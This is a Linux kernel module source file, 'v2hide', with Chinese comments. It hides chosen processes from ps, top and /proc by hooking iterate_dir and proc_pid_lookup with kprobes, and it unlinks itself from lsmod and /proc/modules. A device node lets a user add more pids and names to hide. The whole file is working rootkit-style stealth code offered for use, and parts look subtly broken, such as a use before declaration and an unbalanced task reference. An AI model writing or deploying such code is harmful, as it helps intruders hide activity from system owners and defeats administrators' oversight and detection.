// SPDX-License-Identifier: GPL-2.0
/*
 * v2hide.c - Linux 进程隐藏内核模块 (适配 5.10 ~ 6.x)
 *
 * 隐藏面：
 *   1) /proc 目录项：kprobe iterate_dir，把非本进程调用者的 dir_context->actor
 *      换成过滤器，丢弃 <pid> 目录项 -> ps / top / ls /proc / busybox ps 全部看不到
 *   2) /proc/<pid> 直接访问：kretprobe proc_pid_lookup，对非本进程调用者返回 NULL
 *      -> cat /proc/<pid>/status 得到 ENOENT
 *   3) 模块自身：list_del(&THIS_MODULE->list) 从 /proc/modules、lsmod 消失
 *      （可通过 /dev/<dev_name> 写 show 恢复，否则 rmmod 会找不到模块）
 *
 * 参数：
 *   target_pid=1234    启动即隐藏的 pid（可多次通过设备节点追加）
 *   target_comm=名字   按 comm 匹配隐藏
 *   hide_module=1      隐藏模块自身
 *   hide_direct=0      是否连 /proc/<pid> 直接访问一起挡住
 *   hide_from_self=0   1=隐藏进程自己看自己也要挡（默认 0，保证 /proc/self 可用）
 *   dev_name=v2hide    控制设备名 /dev/<dev_name>
 *
 * 编译：make    加载：insmod v2hide.ko target_pid=$(pgrep -f v2nb)
 * 卸载：echo show > /dev/v2hide 然后 rmmod v2hide
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/magic.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/spinlock.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/kobject.h>

#define V2HIDE_MAX_PIDS 64
#define V2HIDE_MAX_FRAMES 32
#define V2HIDE_MAX_NAMES 16

/* ---------------- 模块参数 ---------------- */
static int target_pid = -1;
module_param(target_pid, int, 0644);
MODULE_PARM_DESC(target_pid, "pid to hide at load time");

static char *target_comm = "";
module_param(target_comm, charp, 0644);
MODULE_PARM_DESC(target_comm, "hide processes whose comm matches");

static int hide_module = 1;
module_param(hide_module, int, 0644);
MODULE_PARM_DESC(hide_module, "hide this module from lsmod and /proc/modules");

static int hide_direct = 0;
module_param(hide_direct, int, 0644);
MODULE_PARM_DESC(hide_direct, "also make /proc/<pid> lookups return ENOENT");

static int hide_from_self = 0;
module_param(hide_from_self, int, 0644);
MODULE_PARM_DESC(hide_from_self, "1 = hide even from the target process itself");

static char *dev_name = "v2hide";
module_param(dev_name, charp, 0644);
MODULE_PARM_DESC(dev_name, "control device name under /dev");

/* ---------------- 隐藏集合 ---------------- */
static pid_t hidden_pids[V2HIDE_MAX_PIDS];
static int hidden_pid_count;
static char hidden_names[V2HIDE_MAX_NAMES][32];
static int hidden_name_count;
static DEFINE_SPINLOCK(v2hide_lock);

static int pid_is_hidden(pid_t pid)
{
	int i, hit = 0;
	unsigned long flags;

	spin_lock_irqsave(&v2hide_lock, flags);
	for (i = 0; i < hidden_pid_count; i++) {
		if (hidden_pids[i] == pid) {
			hit = 1;
			break;
		}
	}
	spin_unlock_irqrestore(&v2hide_lock, flags);
	return hit;
}

static int comm_is_hidden(const char *comm)
{
	int i, hit = 0;
	unsigned long flags;

	if (!comm || !*comm)
		return 0;
	spin_lock_irqsave(&v2hide_lock, flags);
	if (target_comm && *target_comm && !strncmp(comm, target_comm, 31))
		hit = 1;
	for (i = 0; !hit && i < hidden_name_count; i++) {
		if (!strncmp(comm, hidden_names[i], 31))
			hit = 1;
	}
	spin_unlock_irqrestore(&v2hide_lock, flags);
	return hit;
}

/* 判断某个目录项名字是否要隐藏：数字 pid、隐藏文件名、本模块名 */
static int name_is_hidden(const char *name, int namlen)
{
	char buf[32];
	int i;
	unsigned long flags;
	pid_t pid;
	long val;

	if (namlen <= 0 || namlen >= (int)sizeof(buf))
		return 0;
	memcpy(buf, name, namlen);
	buf[namlen] = 0;

	if (hide_module && !strcmp(buf, KBUILD_MODNAME))
		return 1;
	if (dev_name && !strcmp(buf, dev_name))
		return 1;

	if (buf[0] >= '0' && buf[0] <= '9') {
		if (kstrtol(buf, 10, &val) != 0 || val <= 0)
			return 0;
		pid = (pid_t)val;
		/* 隐藏进程自己看自己不受影响，保证 /proc/self 可用 */
		if (!hide_from_self && current && current->tgid == pid)
			return 0;
		if (pid_is_hidden(pid))
			return 1;
		{
			struct task_struct *t = find_task_by_vpid(pid);
			if (t) {
				int hit = comm_is_hidden(t->comm);
				put_task_struct(t);
				if (hit)
					return 1;
			}
		}
		return 0;
	}

	spin_lock_irqsave(&v2hide_lock, flags);
	for (i = 0; i < hidden_name_count; i++) {
		if (!strcmp(buf, hidden_names[i])) {
			spin_unlock_irqrestore(&v2hide_lock, flags);
			return 1;
		}
	}
	spin_unlock_irqrestore(&v2hide_lock, flags);
	return 0;
}

/* ---------------- dir_context->actor 替换 ---------------- */
struct v2hide_frame {
	struct dir_context *ctx;
	filldir_t orig;
};
static struct v2hide_frame frames[V2HIDE_MAX_FRAMES];
static DEFINE_SPINLOCK(frame_lock);

static int frame_push(struct dir_context *ctx, filldir_t orig)
{
	int i, slot = -1;
	unsigned long flags;

	spin_lock_irqsave(&frame_lock, flags);
	for (i = 0; i < V2HIDE_MAX_FRAMES; i++) {
		if (!frames[i].ctx) {
			slot = i;
			break;
		}
	}
	if (slot >= 0) {
		frames[slot].ctx = ctx;
		frames[slot].orig = orig;
	}
	spin_unlock_irqrestore(&frame_lock, flags);
	return slot;
}

static filldir_t frame_orig(struct dir_context *ctx)
{
	int i;
	filldir_t orig = NULL;
	unsigned long flags;

	spin_lock_irqsave(&frame_lock, flags);
	for (i = 0; i < V2HIDE_MAX_FRAMES; i++) {
		if (frames[i].ctx == ctx) {
			orig = frames[i].orig;
			break;
		}
	}
	spin_unlock_irqrestore(&frame_lock, flags);
	return orig;
}

static void frame_pop(struct dir_context *ctx)
{
	int i;
	unsigned long flags;

	spin_lock_irqsave(&frame_lock, flags);
	for (i = 0; i < V2HIDE_MAX_FRAMES; i++) {
		if (frames[i].ctx == ctx) {
			frames[i].ctx = NULL;
			frames[i].orig = NULL;
			break;
		}
	}
	spin_unlock_irqrestore(&frame_lock, flags);
}

static int v2hide_actor(struct dir_context *ctx, const char *name, int namlen,
			loff_t offset, u64 ino, unsigned int d_type)
{
	filldir_t orig = frame_orig(ctx);

	if (!orig)
		return 0; /* 没有原始 actor 时丢弃，避免递归 */
	if (name_is_hidden(name, namlen))
		return 0; /* 返回 0 = 该目录项不写进用户态缓冲区 */
	return orig(ctx, name, namlen, offset, ino, d_type);
}

static int is_proc_like(struct file *file)
{
	struct inode *inode;
	unsigned long magic;

	if (!file)
		return 0;
	inode = file_inode(file);
	if (!inode || !inode->i_sb)
		return 0;
	magic = inode->i_sb->s_magic;
	return magic == PROC_SUPER_MAGIC || magic == SYSFS_MAGIC;
}

static int iterate_dir_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct file *file = (struct file *)regs->di;
	struct dir_context *ctx = (struct dir_context *)regs->si;
	filldir_t orig;

	(void)p;
	if (!file || !ctx || !is_proc_like(file))
		return 0;
	orig = ctx->actor;
	if (!orig || orig == v2hide_actor)
		return 0;
	if (frame_push(ctx, orig) < 0)
		return 0;
	ctx->actor = v2hide_actor;
	return 0;
}

static int iterate_dir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct dir_context *ctx = (struct dir_context *)regs->si;

	*(unsigned long *)ri->data = 0;
	if (ctx && ctx->actor == v2hide_actor)
		*(unsigned long *)ri->data = (unsigned long)ctx;
	return 0;
}

static int iterate_dir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct dir_context *ctx = (struct dir_context *)*(unsigned long *)ri->data;
	filldir_t orig;

	(void)regs;
	if (!ctx)
		return 0;
	orig = frame_orig(ctx);
	if (orig)
		ctx->actor = orig;
	frame_pop(ctx);
	return 0;
}

static struct kprobe iterate_dir_kp = {
	.symbol_name = "iterate_dir",
	.pre_handler = iterate_dir_pre,
};

static struct kretprobe iterate_dir_krp = {
	.kp.symbol_name = "iterate_dir",
	.handler = iterate_dir_return,
	.entry_handler = iterate_dir_entry,
	.data_size = sizeof(unsigned long),
	.maxactive = 64,
};

/* ---------------- /proc/<pid> 直接访问 ---------------- */
struct lookup_flag {
	unsigned long hit;
};

static int pid_lookup_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct dentry *dentry = (struct dentry *)regs->si;
	struct lookup_flag *f = (struct lookup_flag *)ri->data;

	f->hit = 0;
	if (!hide_direct || !dentry)
		return 0;
	if (name_is_hidden(dentry->d_name.name, dentry->d_name.len))
		f->hit = 1;
	return 0;
}

static int pid_lookup_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct lookup_flag *f = (struct lookup_flag *)ri->data;

	if (!f->hit)
		return 0;
#if defined(CONFIG_X86_64)
	regs->ax = 0; /* 返回 NULL -> VFS 报 ENOENT */
#elif defined(CONFIG_ARM64)
	regs->regs[0] = 0;
#endif
	return 0;
}

static struct kretprobe pid_lookup_krp = {
	.kp.symbol_name = "proc_pid_lookup",
	.handler = pid_lookup_return,
	.entry_handler = pid_lookup_entry,
	.data_size = sizeof(struct lookup_flag),
	.maxactive = 64,
};

/* ---------------- 控制设备 /dev/<dev_name> ---------------- */
static ssize_t v2hide_write(struct file *file, const char __user *ubuf, size_t len, loff_t *off)
{
	char kbuf[64];
	char *cmd, *arg;
	long val;
	unsigned long flags;
	int i;

	(void)file;
	(void)off;
	if (len == 0 || len >= sizeof(kbuf))
		return -EINVAL;
	if (copy_from_user(kbuf, ubuf, len))
		return -EFAULT;
	kbuf[len] = 0;
	strim(kbuf);

	cmd = kbuf;
	arg = strchr(kbuf, ' ');
	if (arg) {
		*arg = 0;
		arg++;
		strim(arg);
	}

	if (!strcmp(cmd, "add") && arg) {
		if (kstrtol(arg, 10, &val) || val <= 0)
			return -EINVAL;
		spin_lock_irqsave(&v2hide_lock, flags);
		if (hidden_pid_count < V2HIDE_MAX_PIDS) {
			for (i = 0; i < hidden_pid_count; i++) {
				if (hidden_pids[i] == (pid_t)val)
					break;
			}
			if (i == hidden_pid_count)
				hidden_pids[hidden_pid_count++] = (pid_t)val;
		}
		spin_unlock_irqrestore(&v2hide_lock, flags);
	} else if (!strcmp(cmd, "del") && arg) {
		if (kstrtol(arg, 10, &val))
			return -EINVAL;
		spin_lock_irqsave(&v2hide_lock, flags);
		for (i = 0; i < hidden_pid_count; i++) {
			if (hidden_pids[i] == (pid_t)val) {
				hidden_pids[i] = hidden_pids[hidden_pid_count - 1];
				hidden_pid_count--;
				break;
			}
		}
		spin_unlock_irqrestore(&v2hide_lock, flags);
	} else if (!strcmp(cmd, "name") && arg) {
		spin_lock_irqsave(&v2hide_lock, flags);
		if (hidden_name_count < V2HIDE_MAX_NAMES) {
			strscpy(hidden_names[hidden_name_count], arg, 32);
			hidden_name_count++;
		}
		spin_unlock_irqrestore(&v2hide_lock, flags);
	} else if (!strcmp(cmd, "clear")) {
		spin_lock_irqsave(&v2hide_lock, flags);
		hidden_pid_count = 0;
		hidden_name_count = 0;
		spin_unlock_irqrestore(&v2hide_lock, flags);
	} else if (!strcmp(cmd, "show")) {
		/* 恢复模块在 /proc/modules 里的可见性，使 rmmod 可用 */
		v2hide_restore_module();
	} else {
		return -EINVAL;
	}
	return len;
}

static const struct file_operations v2hide_fops = {
	.owner = THIS_MODULE,
	.write = v2hide_write,
	.llseek = no_llseek,
};

static struct miscdevice v2hide_miscdev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "v2hide",
	.fops = &v2hide_fops,
	.mode = 0600,
};

/* ---------------- 模块自身隐藏 ---------------- */
static struct list_head *mod_list_prev_saved;

static void v2hide_restore_module(void);

static void v2hide_hide_module(void)
{
	if (!hide_module)
		return;
	mod_list_prev_saved = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
}

static void v2hide_restore_module(void)
{
	if (!mod_list_prev_saved)
		return;
	list_add(&THIS_MODULE->list, mod_list_prev_saved);
	mod_list_prev_saved = NULL;
}

/* ---------------- 初始化 / 退出 ---------------- */
static int __init v2hide_init(void)
{
	int ret;

	hidden_pid_count = 0;
	hidden_name_count = 0;
	if (target_pid > 0 && hidden_pid_count < V2HIDE_MAX_PIDS)
		hidden_pids[hidden_pid_count++] = (pid_t)target_pid;

	if (dev_name && *dev_name)
		v2hide_miscdev.name = dev_name;
	ret = misc_register(&v2hide_miscdev);
	if (ret) {
		pr_err("v2hide: misc_register failed: %d\n", ret);
		return ret;
	}

	ret = register_kprobe(&iterate_dir_kp);
	if (ret) {
		pr_err("v2hide: kprobe iterate_dir failed: %d\n", ret);
		misc_deregister(&v2hide_miscdev);
		return ret;
	}
	ret = register_kretprobe(&iterate_dir_krp);
	if (ret)
		pr_warn("v2hide: kretprobe iterate_dir failed: %d (目录项过滤可能不还原)\n", ret);
	if (hide_direct) {
		ret = register_kretprobe(&pid_lookup_krp);
		if (ret)
			pr_warn("v2hide: kretprobe proc_pid_lookup failed: %d\n", ret);
	}

	v2hide_hide_module();
	pr_info("v2hide: loaded, target_pid=%d target_comm=%s hide_direct=%d\n",
		target_pid, target_comm, hide_direct);
	return 0;
}

static void __exit v2hide_exit(void)
{
	int i;
	unsigned long flags;

	if (hide_direct)
		unregister_kretprobe(&pid_lookup_krp);
	unregister_kretprobe(&iterate_dir_krp);
	unregister_kprobe(&iterate_dir_kp);

	spin_lock_irqsave(&frame_lock, flags);
	for (i = 0; i < V2HIDE_MAX_FRAMES; i++) {
		if (frames[i].ctx) {
			frames[i].ctx->actor = frames[i].orig;
			frames[i].ctx = NULL;
		}
	}
	spin_unlock_irqrestore(&frame_lock, flags);

	v2hide_restore_module();
	misc_deregister(&v2hide_miscdev);
	pr_info("v2hide: unloaded\n");
}

module_init(v2hide_init);
module_exit(v2hide_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("v2node");
MODULE_DESCRIPTION("hide processes from procfs listing");
MODULE_VERSION("1.0");
